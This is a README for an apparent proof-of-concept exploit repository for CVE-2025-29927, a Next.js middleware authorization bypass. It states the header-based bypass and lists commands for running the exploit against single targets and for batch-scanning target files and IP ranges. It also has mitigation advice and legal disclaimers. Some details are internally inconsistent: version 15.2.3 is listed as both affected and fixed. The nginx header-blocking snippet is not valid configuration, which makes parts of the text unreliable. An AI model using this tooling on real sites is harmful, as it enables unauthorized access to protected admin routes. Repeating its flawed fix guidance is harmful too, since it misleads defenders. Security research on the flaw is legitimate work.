# CVE-2025-29927 - Next.js Middleware Authorization Bypass POC

> ⚠️ **Legal Disclaimer**: This tool is intended for security research, authorized penetration testing, and educational purposes only. Using this tool against targets without explicit permission is illegal and unethical.

## 📋 Overview

**CVE-2025-29927** is a critical security vulnerability in Next.js that allows attackers to bypass middleware-based authorization controls by exploiting improper handling of the `x-middleware-subrequest` header.

### 🎯 Vulnerability Details

| Attribute | Value |
|-----------|--------|
| **CVE ID** | CVE-2025-29927 |
| **CVSS Score** | 9.8 (CRITICAL) |
| **Affected Versions** | Next.js 13.4.0 - 15.2.3 |
| **Fixed Versions** | Next.js 14.2.25+, 15.2.3+ |
| **Discovery Date** | March 21, 2025 |
| **Vulnerability Type** | Authorization Bypass |

### 🔍 Technical Details

**Root Cause**: Next.js middleware processes the `x-middleware-subrequest` header incorrectly, treating requests with this header as internal trusted sub-requests and bypassing authorization checks.

**Impact**: Attackers can access protected routes (e.g., `/admin`, `/api/sensitive`) without authentication.

## 🚀 Features

- ✅ Single-file Python exploit
- ✅ Automated vulnerability detection
- ✅ Batch scanning support
- ✅ Docker-based vulnerable environment
- ✅ Detailed logging and output
- ✅ No external dependencies (only `requests`)

## 📦 Installation

```bash
# Clone the repository
git clone https://github.com/hujiaozhuzhu/CVE-2025-29927-POC.git
cd CVE-2025-29927-POC

# Install dependencies
pip install -r requirements.txt
```

## 🎯 Usage

### Quick Start (Exploit Single Target)

```bash
python exploit/cve_2025_29927.py -u http://127.0.0.1:3000
```

### Advanced Options

```bash
# Custom admin path
python exploit/cve_2025_29927.py -u http://target.com -p /admin

# Verbose output
python exploit/cve_2025_29927.py -u http://target.com -v

# Save results to file
python exploit/cve_2025_29927.py -u http://target.com -o results.txt
```

### Batch Scanning

```bash
# Scan multiple targets from file
python exploit/batch_scanner.py -f targets.txt

# Scan IP range
python exploit/batch_scanner.py --range 192.168.1.0-255
```

## 🏗️ Setup Vulnerable Environment

### Using Docker (Recommended)

```bash
cd target
docker-compose up -d
```

Access the vulnerable application at `http://localhost:3000`

### Manual Setup

```bash
cd target
npm install
npm run dev
```

## 📊 Vulnerability Detection Flow

1. **Normal Request**: Sends GET request without exploit headers
   - Expected: 302/401/403 (blocked by middleware)

2. **Exploit Request**: Sends GET request with `x-middleware-subrequest: 1`
   - Expected: 200 (bypasses middleware)
   - Success: Response contains admin content

## 🛡️ Mitigation & Defense

### Immediate Actions

1. **Upgrade Next.js**
   ```bash
   npm install next@latest
   # or
   npm install next@14.2.25
   ```

2. **Block Vulnerable Header** in reverse proxy
   ```nginx
   location / {
     deny x-middleware-subrequest;
     # ... rest of config
   }
   ```

### Long-term Recommendations

- Implement defense-in-depth (multiple auth layers)
- Regular security audits
- Keep dependencies updated
- Use Web Application Firewall (WAF)

## 📚 Documentation

- [Vulnerability Analysis](docs/vuln_analysis.md)
- [Usage Guide](docs/usage_guide.md)
- [Defense & Remediation](docs/defense.md)

## 🧪 Testing

### Manual Testing

```bash
# Run vulnerability test
python exploit/cve_2025_29927.py -u http://localhost:3000 -t
```

### Automated Testing

```bash
# Run test suite
python tests/test_exploit.py
```

## 🔬 Research References

- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-29927)
- [Next.js Security Advisory](https://github.com/vercel/next.js/security/advisories)
- [Technical Analysis](https://securitylabs.datadoghq.com/articles/nextjs-middleware-auth-bypass/)

## 📝 Changelog

### v1.0.0 (2025-04-02)
- Initial release
- Single-target exploitation
- Batch scanning support
- Docker vulnerable environment
- Comprehensive documentation

## 👥 Contributors

- [Your Name] - Initial implementation

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## ⚠️ Legal Disclaimer

**IMPORTANT**: This tool is provided for educational and authorized security testing purposes only.

- Use only on systems you own or have explicit permission to test
- Unauthorized access to computer systems is illegal
- Report vulnerabilities responsibly to vendors
- Follow responsible disclosure guidelines

**By using this tool, you agree to:**
- Comply with all applicable laws and regulations
- Use only for authorized security testing
- Report discovered vulnerabilities responsibly
- Not use for malicious purposes

## 📞 Reporting Vulnerabilities

If you find issues with this tool or discover new vulnerabilities, please report them responsibly:

1. Contact the vendor (Vercel/Next.js team)
2. Follow responsible disclosure guidelines
3. Consider joining bug bounty programs

## 🙏 Acknowledgments

- Vercel/Next.js team for prompt disclosure and fix
- Security research community for analysis and testing
- Vulnerability discoverers

---

**Remember**: Security research should always be ethical and legal. Use your skills to make the internet safer! 🛡️
